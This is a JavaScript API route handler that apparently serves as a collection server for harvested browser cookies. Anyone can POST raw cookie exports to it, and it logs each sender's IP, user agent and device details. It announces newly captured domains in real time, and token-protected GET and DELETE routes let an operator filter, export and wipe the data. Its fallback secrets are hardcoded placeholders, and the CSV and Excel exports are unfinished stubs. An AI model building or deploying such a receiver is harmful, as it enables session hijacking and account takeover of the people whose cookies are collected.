import { Server } from 'socket.io';
import CryptoJS from 'crypto-js';
import jwt from 'jsonwebtoken';
import rateLimit from 'express-rate-limit';

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key';
const JWT_SECRET = process.env.JWT_SECRET || 'your-jwt-secret';

// In-memory storage (replace with database in production)
let cookieStore = {
  entries: [],
  domains: new Set(),
  users: new Map(),
  searchHistory: new Map()
};

// WebSocket setup for real-time updates
let io;
if (global.io) {
  io = global.io;
} else {
  io = new Server();
  global.io = io;
}

// Rate limiting setup
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Utility functions
const encryptValue = (value) => {
  return CryptoJS.AES.encrypt(value, ENCRYPTION_KEY).toString();
};

const decryptValue = (encrypted) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, ENCRYPTION_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

const generateToken = (userId) => {
  return jwt.sign({ userId }, JWT_SECRET, { expiresIn: '24h' });
};

const verifyToken = (token) => {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return null;
  }
};

const processNewDomain = (domain) => {
  if (!cookieStore.domains.has(domain)) {
    cookieStore.domains.add(domain);
    io.emit('newDomain', { domain, timestamp: new Date().toISOString() });
  }
};

// Request handlers
async function handlePost(req, res) {
  try {
    let body = req.body;
    if (typeof body === 'string') {
      body = JSON.parse(body);
    }

    // Validate request
    if (!body.cookies || !Array.isArray(body.cookies)) {
      return res.status(400).json({ error: 'Invalid cookie data format' });
    }

    // Process cookies
    const processedCookies = body.cookies.map(cookie => ({
      ...cookie,
      value: encryptValue(cookie['Content raw']),
      domain: cookie['Host raw'],
      timestamp: new Date().toISOString(),
      metadata: {
        browser: body.deviceInfo?.browser || 'unknown',
        os: body.deviceInfo?.os || 'unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
        userAgent: req.headers['user-agent']
      }
    }));

    // Store data
    const entry = {
      id: Date.now().toString(),
      userId: body.userId,
      timestamp: new Date().toISOString(),
      cookies: processedCookies,
      url: body.url,
      deviceInfo: body.deviceInfo,
      cookieCount: processedCookies.length
    };

    cookieStore.entries.unshift(entry);

    // Process domains
    processedCookies.forEach(cookie => {
      const domain = new URL(cookie.domain).hostname;
      processNewDomain(domain);
    });

    // Emit real-time update
    io.emit('newCookies', {
      count: processedCookies.length,
      domains: Array.from(new Set(processedCookies.map(c => new URL(c.domain).hostname))),
      timestamp: entry.timestamp
    });

    // Cleanup old entries
    if (cookieStore.entries.length > 1000) {
      cookieStore.entries = cookieStore.entries.slice(0, 900);
    }

    res.status(200).json({
      status: 'success',
      entry: {
        id: entry.id,
        timestamp: entry.timestamp,
        cookieCount: entry.cookieCount
      }
    });
  } catch (error) {
    console.error('Error processing webhook:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(req, res) {
  try {
    const {
      userId,
      domain,
      startDate,
      endDate,
      limit = 50,
      format = 'json'
    } = req.query;

    let filteredEntries = cookieStore.entries;

    // Apply filters
    if (userId) {
      filteredEntries = filteredEntries.filter(entry => entry.userId === userId);
    }
    if (domain) {
      filteredEntries = filteredEntries.filter(entry => 
        entry.cookies.some(cookie => new URL(cookie.domain).hostname.includes(domain))
      );
    }
    if (startDate && endDate) {
      filteredEntries = filteredEntries.filter(entry => {
        const timestamp = new Date(entry.timestamp);
        return timestamp >= new Date(startDate) && timestamp <= new Date(endDate);
      });
    }

    // Limit results
    filteredEntries = filteredEntries.slice(0, parseInt(limit));

    // Format response
    switch (format.toLowerCase()) {
      case 'csv':
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=cookies.csv');
        // Implement CSV formatting
        break;
      case 'excel':
        res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        res.setHeader('Content-Disposition', 'attachment; filename=cookies.xlsx');
        // Implement Excel formatting
        break;
      default:
        res.setHeader('Content-Type', 'application/json');
        return res.status(200).json(filteredEntries);
    }
  } catch (error) {
    console.error('Error retrieving data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

async function handleDelete(req, res) {
  try {
    const { ids, userId, deleteAll } = req.body;

    if (deleteAll) {
      const deletedCount = cookieStore.entries.length;
      cookieStore.entries = [];
      cookieStore.domains.clear();
      io.emit('dataCleared', { deletedCount });
      return res.status(200).json({ message: `Deleted ${deletedCount} entries` });
    }

    if (userId) {
      const initialCount = cookieStore.entries.length;
      cookieStore.entries = cookieStore.entries.filter(entry => entry.userId !== userId);
      const deletedCount = initialCount - cookieStore.entries.length;
      io.emit('dataDeleted', { userId, deletedCount });
      return res.status(200).json({ message: `Deleted ${deletedCount} entries for user ${userId}` });
    }

    if (ids && Array.isArray(ids)) {
      cookieStore.entries = cookieStore.entries.filter(entry => !ids.includes(entry.id));
      io.emit('entriesDeleted', { ids });
      return res.status(200).json({ message: `Deleted ${ids.length} entries` });
    }

    res.status(400).json({ error: 'Invalid delete request' });
  } catch (error) {
    console.error('Error deleting data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

// Main handler
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apply rate limiting
  await new Promise((resolve) => limiter(req, res, resolve));

  // Verify authentication for sensitive operations
  if (req.method !== 'POST') {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token || !verifyToken(token)) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
  }

  // Route requests
  try {
    switch (req.method) {
      case 'POST':
        return await handlePost(req, res);
      case 'GET':
        return await handleGet(req, res);
      case 'DELETE':
        return await handleDelete(req, res);
      default:
        res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Request handler error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}